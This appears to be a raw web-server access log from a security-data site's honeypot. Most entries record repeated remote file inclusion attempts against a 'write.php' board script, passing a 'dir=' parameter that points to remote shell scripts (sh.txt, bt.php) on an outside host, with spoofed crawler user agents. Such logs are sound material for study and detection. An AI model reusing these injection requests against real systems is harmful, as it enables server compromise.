71.6.150.241 - - [23/Feb/2015:10:42:48 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
112.218.68.155 - - [23/Feb/2015:10:42:49 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
71.6.150.241 - - [23/Feb/2015:10:42:50 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
71.6.150.241 - - [23/Feb/2015:10:42:50 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
112.218.68.155 - - [23/Feb/2015:10:42:50 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
71.6.150.241 - - [23/Feb/2015:10:42:51 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
112.218.68.155 - - [23/Feb/2015:10:42:51 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
112.218.68.155 - - [23/Feb/2015:10:42:53 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
112.218.68.155 - - [23/Feb/2015:10:42:54 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
112.218.68.155 - - [23/Feb/2015:10:42:56 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
112.218.68.155 - - [23/Feb/2015:10:42:56 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
112.218.68.155 - - [23/Feb/2015:10:43:00 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
176.31.252.38 - - [23/Feb/2015:10:45:33 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
176.31.252.38 - - [23/Feb/2015:10:45:34 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
176.31.252.38 - - [23/Feb/2015:10:45:34 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
176.31.252.38 - - [23/Feb/2015:10:45:36 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
176.31.252.38 - - [23/Feb/2015:10:45:46 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [23/Feb/2015:10:45:47 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [23/Feb/2015:10:45:47 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [23/Feb/2015:10:45:48 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
71.6.150.241 - - [23/Feb/2015:10:48:36 -0800] "GET ////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
71.6.150.241 - - [23/Feb/2015:10:48:37 -0800] "GET ////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
71.6.150.241 - - [23/Feb/2015:10:48:37 -0800] "POST ////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
71.6.150.241 - - [23/Feb/2015:10:48:38 -0800] "POST ////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
71.6.150.241 - - [23/Feb/2015:10:49:08 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
71.6.150.241 - - [23/Feb/2015:10:49:09 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
71.6.150.241 - - [23/Feb/2015:10:49:09 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
71.6.150.241 - - [23/Feb/2015:10:49:10 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
112.218.68.155 - - [23/Feb/2015:10:49:21 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
112.218.68.155 - - [23/Feb/2015:10:49:23 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
112.218.68.155 - - [23/Feb/2015:10:49:24 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
112.218.68.155 - - [23/Feb/2015:10:49:25 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
71.6.150.241 - - [23/Feb/2015:10:49:29 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
71.6.150.241 - - [23/Feb/2015:10:49:30 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
71.6.150.241 - - [23/Feb/2015:10:49:30 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
71.6.150.241 - - [23/Feb/2015:10:49:31 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
46.119.124.167 - - [23/Feb/2015:10:59:34 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://yt-d.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)" 
46.119.124.167 - - [23/Feb/2015:10:59:35 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://yt-d.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)" 
46.119.124.167 - - [23/Feb/2015:10:59:35 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://yt-d.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)" 
176.31.252.38 - - [23/Feb/2015:11:02:58 -0800] "GET /honeypot////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
176.31.252.38 - - [23/Feb/2015:11:02:59 -0800] "GET /honeypot////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
176.31.252.38 - - [23/Feb/2015:11:02:59 -0800] "POST /honeypot////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
176.31.252.38 - - [23/Feb/2015:11:03:00 -0800] "POST /honeypot////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
176.31.252.38 - - [23/Feb/2015:11:03:00 -0800] "GET ////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
176.31.252.38 - - [23/Feb/2015:11:03:02 -0800] "GET ////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
176.31.252.38 - - [23/Feb/2015:11:03:02 -0800] "POST ////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
176.31.252.38 - - [23/Feb/2015:11:03:03 -0800] "POST ////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
176.31.252.38 - - [23/Feb/2015:11:03:20 -0800] "GET /honeypot////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [23/Feb/2015:11:03:21 -0800] "GET /honeypot////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [23/Feb/2015:11:03:21 -0800] "POST /honeypot////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [23/Feb/2015:11:03:22 -0800] "POST /honeypot////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [23/Feb/2015:11:03:23 -0800] "GET ////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [23/Feb/2015:11:03:24 -0800] "GET ////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [23/Feb/2015:11:03:24 -0800] "POST ////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [23/Feb/2015:11:03:25 -0800] "POST ////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [23/Feb/2015:11:09:36 -0800] "GET /honeypot////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [23/Feb/2015:11:09:37 -0800] "GET /honeypot////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [23/Feb/2015:11:09:37 -0800] "POST /honeypot////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [23/Feb/2015:11:09:38 -0800] "POST /honeypot////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [23/Feb/2015:11:09:38 -0800] "GET ////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [23/Feb/2015:11:09:40 -0800] "GET ////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [23/Feb/2015:11:09:40 -0800] "POST ////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [23/Feb/2015:11:09:41 -0800] "POST ////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
96.226.136.97 - - [23/Feb/2015:11:22:00 -0800] "GET / HTTP/1.1" 200 6788 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36" 
96.226.136.97 - - [23/Feb/2015:11:22:00 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36" 
96.226.136.97 - - [23/Feb/2015:11:22:03 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36" 
150.70.173.58 - - [23/Feb/2015:11:23:16 -0800] "GET / HTTP/1.1" 200 21915 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 
176.31.252.38 - - [23/Feb/2015:11:26:50 -0800] "GET /honeypot////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [23/Feb/2015:11:26:51 -0800] "GET /honeypot////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [23/Feb/2015:11:26:51 -0800] "POST /honeypot////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [23/Feb/2015:11:26:52 -0800] "POST /honeypot////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [23/Feb/2015:11:26:52 -0800] "GET ////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [23/Feb/2015:11:26:53 -0800] "GET ////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [23/Feb/2015:11:26:54 -0800] "POST ////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [23/Feb/2015:11:26:55 -0800] "POST ////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
66.102.6.244 - - [23/Feb/2015:11:33:25 -0800] "GET / HTTP/1.1" 200 6788 "-" "Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20110814 Firefox/6.0 Google favicon" 
66.102.6.252 - - [23/Feb/2015:11:33:25 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20110814 Firefox/6.0 Google favicon" 
115.112.103.66 - - [23/Feb/2015:11:40:48 -0800] "GET / HTTP/1.1" 200 6788 "https://www.google.co.in/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36" 
115.112.103.66 - - [23/Feb/2015:11:40:48 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36" 
115.112.103.66 - - [23/Feb/2015:11:40:51 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36" 
221.237.20.248 - - [23/Feb/2015:11:51:49 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 418 584 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" 
176.31.252.38 - - [23/Feb/2015:12:16:13 -0800] "GET /honeypot////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [23/Feb/2015:12:16:15 -0800] "GET /honeypot////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [23/Feb/2015:12:16:15 -0800] "POST /honeypot////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [23/Feb/2015:12:16:16 -0800] "POST /honeypot////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [23/Feb/2015:12:16:16 -0800] "GET ////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [23/Feb/2015:12:16:17 -0800] "GET ////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [23/Feb/2015:12:16:17 -0800] "POST ////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [23/Feb/2015:12:16:19 -0800] "POST ////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
71.6.150.241 - - [23/Feb/2015:12:18:58 -0800] "GET /honeypot////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
71.6.150.241 - - [23/Feb/2015:12:18:59 -0800] "GET /honeypot////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
71.6.150.241 - - [23/Feb/2015:12:18:59 -0800] "POST /honeypot////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
71.6.150.241 - - [23/Feb/2015:12:19:00 -0800] "POST /honeypot////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
71.6.150.241 - - [23/Feb/2015:12:19:00 -0800] "GET ////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
71.6.150.241 - - [23/Feb/2015:12:19:02 -0800] "GET ////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
71.6.150.241 - - [23/Feb/2015:12:19:02 -0800] "POST ////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
71.6.150.241 - - [23/Feb/2015:12:19:03 -0800] "POST ////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
71.6.150.241 - - [23/Feb/2015:12:19:30 -0800] "GET /honeypot////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
71.6.150.241 - - [23/Feb/2015:12:19:31 -0800] "GET /honeypot////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
71.6.150.241 - - [23/Feb/2015:12:19:31 -0800] "POST /honeypot////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
71.6.150.241 - - [23/Feb/2015:12:19:32 -0800] "POST /honeypot////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
